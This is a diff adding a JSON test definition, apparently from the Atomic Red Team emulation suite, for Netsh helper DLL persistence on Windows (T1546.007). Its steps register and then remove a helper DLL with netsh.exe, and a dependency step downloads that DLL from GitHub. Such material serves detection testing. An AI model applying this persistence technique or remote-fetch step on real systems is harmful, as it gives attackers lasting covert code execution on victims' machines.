@@ -1,0 +1,105 @@
+{
+  "id": "3244697d-5a3a-4dfc-941c-550f69f91a4d",
+  "name": "Netsh Helper DLL Registration",
+  "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "78088f82-b697-4119-aa09-d87c7caebe30",
+      "type": "execute-command",
+      "data": {
+        "command": "netsh.exe add helper \"#{helper_file}\"\ntaskkill /im notepad.exe /t /f \u003e NUL 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8b138d86-8c4d-434e-84e2-c400f0bd6093",
+      "type": "execute-command",
+      "data": {
+        "command": "netsh.exe delete helper \"#{helper_file}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e264a6a2-4157-463a-a466-b321b4d5f434",
+      "name": "Check dependency 1/1",
+      "description": "Helper DLL must exist on disk at specified location (#{helper_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{helper_file}\") { exit 0} else { exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d952002e-cb44-4aa8-b14c-2206a741cf75",
+      "name": "Resolve dependency 1/1",
+      "description": "Helper DLL must exist on disk at specified location (#{helper_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{helper_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll\" -OutFile \"#{helper_file}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "00a7dc60-703a-4657-83f4-a478bf24ad70",
+      "name": "Re-check dependency 1/1",
+      "description": "Helper DLL must exist on disk at specified location (#{helper_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{helper_file}\") { exit 0} else { exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "78088f82-b697-4119-aa09-d87c7caebe30",
+      "p": "on-success",
+      "o": "8b138d86-8c4d-434e-84e2-c400f0bd6093"
+    },
+    {
+      "s": "78088f82-b697-4119-aa09-d87c7caebe30",
+      "p": "on-failure",
+      "o": "8b138d86-8c4d-434e-84e2-c400f0bd6093"
+    },
+    {
+      "s": "e264a6a2-4157-463a-a466-b321b4d5f434",
+      "p": "on-success",
+      "o": "78088f82-b697-4119-aa09-d87c7caebe30"
+    },
+    {
+      "s": "e264a6a2-4157-463a-a466-b321b4d5f434",
+      "p": "on-failure",
+      "o": "d952002e-cb44-4aa8-b14c-2206a741cf75"
+    },
+    {
+      "s": "d952002e-cb44-4aa8-b14c-2206a741cf75",
+      "p": "on-success",
+      "o": "00a7dc60-703a-4657-83f4-a478bf24ad70"
+    },
+    {
+      "s": "00a7dc60-703a-4657-83f4-a478bf24ad70",
+      "p": "on-failure",
+      "o": "78088f82-b697-4119-aa09-d87c7caebe30"
+    }
+  ],
+  "tags": [
+    "T1546.007",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "helper_file",
+      "type": "path",
+      "description": "Path to DLL",
+      "value": "PathToAtomicsFolder\\T1546.007\\bin\\NetshHelper.dll"
+    }
+  ]
+}
